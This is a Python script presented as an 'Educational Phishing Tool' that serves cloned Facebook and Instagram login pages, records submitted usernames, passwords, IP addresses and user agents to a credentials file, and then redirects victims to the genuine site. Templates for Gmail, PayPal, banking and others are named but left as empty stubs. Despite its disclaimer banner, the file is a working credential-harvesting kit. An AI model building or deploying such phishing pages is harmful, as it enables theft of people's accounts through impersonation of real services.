#!/usr/bin/env python3
"""
Educational Phishing Tool - Cross-Platform Web Server
Created by: ABID MEHMOOD (The White HAT Hacker)
Compatible with: Windows, Linux, macOS, Termux, Kali Linux
"""

import os
import sys
import http.server
import socketserver
import threading
import webbrowser
import argparse
import json
from datetime import datetime
from urllib.parse import parse_qs

# Cross-platform compatibility
try:
    import termcolor
    HAS_TERMCOLOR = True
except ImportError:
    HAS_TERMCOLOR = False

def colored_print(text, color='white'):
    """Cross-platform colored printing"""
    if HAS_TERMCOLOR:
        print(termcolor.colored(text, color))
    else:
        # ANSI color codes for terminals that support them
        colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'purple': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'reset': '\033[0m'
        }
        if sys.stdout.isatty():
            print(f"{colors.get(color, '')}{text}{colors['reset']}")
        else:
            print(text)

class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        """Custom logging for captured requests"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {format % args}\n"
        
        # Create logs directory if it doesn't exist
        os.makedirs('../logs', exist_ok=True)
        
        try:
            with open('../logs/server.log', 'a', encoding='utf-8') as f:
                f.write(log_entry)
        except Exception:
            pass  # Fail silently if can't write to log
        
        # Also print to console
        colored_print(log_entry.strip(), 'cyan')
    
    def do_POST(self):
        """Handle POST requests for data capture"""
        if self.path == '/capture.php' or self.path.endswith('capture.php'):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse form data
            form_data = parse_qs(post_data)
            
            # Log captured data
            self.log_captured_data(form_data)
            
            # Redirect to real site
            redirect_url = form_data.get('redirect_url', ['https://google.com'])[0]
            self.send_response(302)
            self.send_header('Location', redirect_url)
            self.end_headers()
        else:
            super().do_POST()
    
    def log_captured_data(self, form_data):
        """Log captured credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        log_entry = "\n" + "="*80 + "\n"
        log_entry += f"CAPTURED DATA - {timestamp}\n"
        log_entry += f"IP Address: {ip}\n"
        log_entry += f"User Agent: {user_agent}\n"
        log_entry += "-"*40 + "\n"
        
        for key, values in form_data.items():
            if key != 'redirect_url':
                log_entry += f"{key}: {values[0]}\n"
        
        log_entry += "="*80 + "\n"
        
        # Create captured_data directory if it doesn't exist
        os.makedirs('../captured_data', exist_ok=True)
        
        try:
            with open('../captured_data/credentials.txt', 'a', encoding='utf-8') as f:
                f.write(log_entry)
        except Exception:
            pass  # Fail silently if can't write to log

def start_server(port=8080):
    """Start the HTTP server"""
    try:
        # Change to templates directory
        if os.path.exists('templates'):
            os.chdir('templates')
        else:
            print("\033[31m[!] Templates directory not found!\033[0m")
            return False
        
        # Create server
        handler = PhishingHTTPRequestHandler
        httpd = socketserver.TCPServer(("", port), handler)
        
        print(f"\033[32m[+] Server started on http://localhost:{port}\033[0m")
        print(f"\033[36m[*] Access templates at: http://localhost:{port}/index.html\033[0m")
        print(f"\033[33m[*] Press Ctrl+C to stop the server\033[0m")
        
        # Open browser automatically
        webbrowser.open(f'http://localhost:{port}/index.html')
        
        # Start server
        httpd.serve_forever()
        
    except KeyboardInterrupt:
        print(f"\n\033[33m[*] Server stopped by user\033[0m")
        httpd.shutdown()
        return True
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"\033[31m[!] Port {port} is already in use\033[0m")
            print(f"\033[33m[*] Try a different port or stop existing server\033[0m")
        else:
            print(f"\033[31m[!] Error starting server: {e}\033[0m")
        return False

def create_template(template_name):
    """Create a phishing template"""
    templates = {
        'facebook': create_facebook_template,
        'instagram': create_instagram_template,
        'gmail': create_gmail_template,
        'twitter': create_twitter_template,
        'paypal': create_paypal_template,
        'netflix': create_netflix_template,
        'github': create_github_template,
        'apple': create_apple_template,
        'discord': create_discord_template,
        'banking': create_banking_template
    }
    
    if template_name.lower() in templates:
        templates[template_name.lower()]()
        colored_print(f"[+] {template_name.title()} template created successfully", 'green')
    else:
        colored_print(f"[!] Template '{template_name}' not found", 'red')

def create_facebook_template():
    """Create Facebook login template"""
    html_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 396px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 48px; font-weight: bold; }
        .tagline { text-align: center; color: #606770; font-size: 24px; margin-bottom: 20px; }
        .form-group { margin-bottom: 12px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; outline: none; }
        .login-btn { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin: 12px 0; }
        .login-btn:hover { background: #166fe5; }
        .forgot-password { text-align: center; margin: 16px 0; }
        .forgot-password a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-account { text-align: center; }
        .create-btn { background: #42b883; color: white; padding: 12px 24px; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .create-btn:hover { background: #369870; }
        .footer { text-align: center; margin-top: 20px; color: #8a8d91; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
            
            <form method="POST" action="/capture.php">
                <input type="hidden" name="redirect_url" value="https://facebook.com">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
            
            <div class="divider"></div>
            
            <div class="create-account">
                <button class="create-btn">Create New Account</button>
            </div>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    with open('facebook.html', 'w', encoding='utf-8') as f:
        f.write(html_content)

def create_instagram_template():
    """Create Instagram login template"""
    html_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 350px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; text-align: center; }
        .logo { margin-bottom: 32px; }
        .logo h1 { font-family: 'Billabong', cursive; font-size: 51px; color: #262626; }
        .form-group { margin-bottom: 6px; }
        input { width: 100%; padding: 9px 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
        input:focus { border-color: #a8a8a8; outline: none; background: white; }
        .login-btn { width: 100%; background: #0095f6; color: white; padding: 5px 9px; border: none; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; margin: 8px 0 16px; }
        .login-btn:hover { background: #1877f2; }
        .footer { text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 11px; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            
            <form method="POST" action="/capture.php">
                <input type="hidden" name="redirect_url" value="https://instagram.com">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    with open('instagram.html', 'w', encoding='utf-8') as f:
        f.write(html_content)

# Add more template functions here...
def create_gmail_template():
    """Create Gmail login template"""
    # Gmail template code here
    pass

def create_twitter_template():
    """Create Twitter login template"""
    # Twitter template code here
    pass

def create_paypal_template():
    """Create PayPal login template"""
    # PayPal template code here
    pass

def create_netflix_template():
    """Create Netflix login template"""
    # Netflix template code here
    pass

def create_github_template():
    """Create GitHub login template"""
    # GitHub template code here
    pass

def create_apple_template():
    """Create Apple login template"""
    # Apple template code here
    pass

def create_discord_template():
    """Create Discord login template"""
    # Discord template code here
    pass

def create_banking_template():
    """Create Banking login template"""
    # Banking template code here
    pass

def main():
    parser = argparse.ArgumentParser(description='Educational Phishing Tool Web Server')
    parser.add_argument('--port', type=int, default=8080, help='Port to run server on')
    parser.add_argument('--create-template', type=str, help='Create a specific template')
    parser.add_argument('--list-templates', action='store_true', help='List available templates')
    
    args = parser.parse_args()
    
    colored_print("="*80, 'cyan')
    colored_print("    Educational Phishing Tool - Web Server", 'green')
    colored_print("    Created by: ABID MEHMOOD (The White HAT Hacker)", 'green')
    colored_print("="*80, 'cyan')
    
    # Create templates directory
    os.makedirs('templates', exist_ok=True)
    
    if args.create_template:
        os.chdir('templates')
        create_template(args.create_template)
        return
    
    if args.list_templates:
        templates = ['facebook', 'instagram', 'gmail', 'twitter', 'paypal', 'netflix', 'github', 'apple', 'discord', 'banking']
        colored_print("Available templates:", 'yellow')
        for template in templates:
            colored_print(f"  - {template}", 'cyan')
        return
    
    # Create index page if it doesn't exist
    if not os.path.exists('templates/index.html'):
        colored_print("[*] Creating index page...", 'yellow')
        create_index_page()
    
    # Start server
    start_server(args.port)

def create_index_page():
    """Create the main index page"""
    index_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Educational Phishing Tool - ABID MEHMOOD</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .header { background: rgba(0,0,0,0.1); padding: 20px 0; text-align: center; color: white; }
        .header h1 { font-size: 48px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        .header p { font-size: 18px; opacity: 0.9; }
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
        .warning { background: #e74c3c; color: white; padding: 20px; border-radius: 10px; margin: 30px 0; text-align: center; }
        .warning h3 { margin-bottom: 10px; }
        .templates-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 30px 0; }
        .template-card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transition: transform 0.3s; }
        .template-card:hover { transform: translateY(-5px); }
        .template-card h3 { color: #2c3e50; margin-bottom: 15px; }
        .template-btn { display: inline-block; background: linear-gradient(135deg, #3498db, #2980b9); color: white; padding: 12px 25px; text-decoration: none; border-radius: 8px; font-weight: 600; }
        .footer { text-align: center; color: white; padding: 40px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Educational Phishing Tool</h1>
        <p>Created by ABID MEHMOOD (The White HAT Hacker)</p>
    </div>
    
    <div class="container">
        <div class="warning">
            <h3>WARNING: EDUCATIONAL PURPOSE ONLY</h3>
            <p>This tool is designed for cybersecurity education and awareness. Use responsibly and only in authorized environments.</p>
        </div>
        
        <div class="templates-grid">
            <div class="template-card">
                <h3>Facebook</h3>
                <p>Social media login page template</p>
                <a href="facebook.html" class="template-btn">View Template</a>
            </div>
            <div class="template-card">
                <h3>Instagram</h3>
                <p>Photo sharing platform template</p>
                <a href="instagram.html" class="template-btn">View Template</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <h2>Stay Safe Online</h2>
        <p><strong>Created by ABID MEHMOOD (The White HAT Hacker)</strong></p>
    </div>
</body>
</html>'''
    
    with open('templates/index.html', 'w', encoding='utf-8') as f:
        f.write(index_content)

if __name__ == "__main__":
    main()